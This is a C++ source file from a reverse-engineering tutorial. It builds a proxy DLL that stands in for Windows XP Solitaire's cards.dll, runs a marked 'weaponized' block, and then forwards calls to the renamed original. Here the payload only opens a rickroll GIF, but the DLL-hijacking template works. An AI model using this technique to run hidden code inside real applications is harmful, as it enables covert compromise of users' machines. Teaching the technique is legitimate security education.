/*
Author: jeFF0Falltrades

From the "Reverse Engineering and Weaponizing XP Solitaire" tutorial:
   GitHub: https://github.com/jeFF0Falltrades/Tutorials/tree/master/hacking_weaponizing_solitaire

   YouTube: https://www.youtube.com/watch?v=ZmPArvsSii4

MIT License

Copyright (c) 2022 Jeff Archer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
#include <iostream>
#include <windows.h>

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

// Function signature taken from cards.dll
typedef BOOL(WINAPI *cdtInitPtr)(int *width, int *height);

EXTERN_DLL_EXPORT BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
}

EXTERN_DLL_EXPORT BOOL cdtInit(int *width, int *height)
{
    HINSTANCE loadedDLL = LoadLibrary(TEXT("cards_original.dll"));
    if (!loadedDLL)
    {
        printf("Format message failed with 0x%x\n", GetLastError());
        return FALSE;
    }
    cdtInitPtr proxied_function = (cdtInitPtr)GetProcAddress(loadedDLL, "cdtInit");
    if (!proxied_function)
    {
        return FALSE;
    }
    /***** Start of Weaponized Code *****/
    system("start \"\" \"https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif\"");
    /***** End of Weaponized Code *****/

    // Proxy call to the legitimate cdtInit
    BOOL result = proxied_function(width, height);
    FreeLibrary(loadedDLL);
    return result;
}
